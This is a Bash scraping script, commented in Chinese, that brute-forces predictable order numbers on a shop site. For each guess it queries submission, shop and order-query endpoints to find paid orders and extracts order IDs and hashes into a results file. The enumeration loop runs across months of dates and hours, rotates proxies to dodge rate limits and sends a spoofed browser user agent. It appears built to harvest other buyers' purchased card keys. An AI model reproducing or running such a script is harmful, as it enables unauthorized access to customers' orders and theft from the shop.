#!/bin/bash
# 历史已付款订单快速扫描 - 跳板机后台
set -uo pipefail
source /data/config/proxy.env
export QG_AUTHKEY QG_AUTHPWD
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF="Referer: https://hmjf.lol/shop/"
B="https://hmjf.lol/shop"
OUT=/data/automation/results/hmjf.lol/kami_mine_20260716
LOG=$OUT/paid_hunt_fast.log
FOUND=$OUT/paid_found.jsonl
touch "$FOUND"

refresh_proxy() {
  /data/automation/bin/qg-proxy-fetch.sh >/dev/null 2>&1 || true
  source /data/config/proxy.env
}

go() { curl -s --max-time 12 -x "$PROXY_URL" -A "$UA" -H "$REF" "$@"; }

check_tn() {
  local tn="$1"
  local sub gs qh
  sub=$(go "$B/other/submit.php?type=alipay&orderid=$tn")
  echo "$sub" | grep -q "window.location" || return 0
  echo "$sub" | grep -q "该订单号不存在" && return 0
  gs=$(go "$B/other/getshop.php?trade_no=$tn")
  qh=$(go "$B/?mod=query&data=$tn")
  echo "EXIST $tn gs=$gs" >> "$LOG"
  if echo "$gs" | grep -qv "未付款"; then
    echo "*** PAID_GS $tn $gs" | tee -a "$LOG"
    echo "{\"trade_no\":\"$tn\",\"getshop\":$gs}" >> "$FOUND"
  fi
  if echo "$qh" | grep -qv "没有查询到数据"; then
    echo "*** QUERY $tn" | tee -a "$LOG"
    som=$(echo "$qh" | grep -oP "showOrder\(\K[0-9]+,'[a-f0-9]{32}'" | head -1)
    [ -n "$som" ] && echo "*** SHOWORDER $tn $som" | tee -a "$LOG"
  fi
  sleep 0.15
}

echo "[start] $(date -Iseconds)" | tee -a "$LOG"
n=0
# 2025-11 至 2026-07 每天 12:00 分钟，抽每 25 个后缀
for day in $(seq 0 258); do
  d=$(date -d "2025-11-01 + $day days" +%Y%m%d 2>/dev/null || date -d "2025-11-01" +%Y%m%d)
  for hh in 10 12 14 16 18 20 22; do
    prefix="${d}$(printf '%02d' $hh)0000"
  for s in $(seq 0 999 25); do
      tn="${prefix}$(printf '%03d' $s)"
      [ ${#tn} -eq 17 ] || continue
      check_tn "$tn"
      n=$((n+1))
      [ $((n % 200)) -eq 0 ] && refresh_proxy && echo "  progress n=$n day=$d" | tee -a "$LOG"
    done
  done
done
echo "[done] $(date -Iseconds) total=$n" | tee -a "$LOG"
